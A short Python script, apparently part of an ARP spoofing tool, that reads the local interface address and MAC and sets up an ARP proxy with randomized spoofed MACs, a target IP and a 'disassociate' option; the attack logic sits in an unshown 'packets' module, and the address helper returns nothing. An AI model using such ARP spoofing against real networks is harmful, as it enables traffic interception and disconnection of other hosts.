import re
from  packets import ARPSetupProxy, randomize_mac_addr
from socket import AF_INET, SOCK_DGRAM 
import socket, struct
import fcntl, uuid

def getAdddr(name):
    with socket.socket(AF_INET,  SOCK_DGRAM) as s:
        pack = struct.pack(b"256s", bytes(name, encoding="utf8"))
        socket.inet_ntoa(fcntl.ioctl(s.fileno(), 0x8915, pack)[20:24])

class NetworkObj:
    def __init__(self, *args, ma=None, addr=None):
        self.interface = "enp7s0"
        self.addr = getAdddr(self.interface)
        self.mac  = ":".join(re.findall(".." , "%02x" % uuid.getnode()))

def setArp():
    n = NetworkObj()
    targetDict = {"target_mac": randomize_mac_addr(), "target_ip":"1.1.11.1", "disassociate":True}
    arppxy =ARPSetupProxy(n.interface, n.mac, randomize_mac_addr(), "1.1.1.1", **targetDict)

# ARPAttackPackets()

setArp()
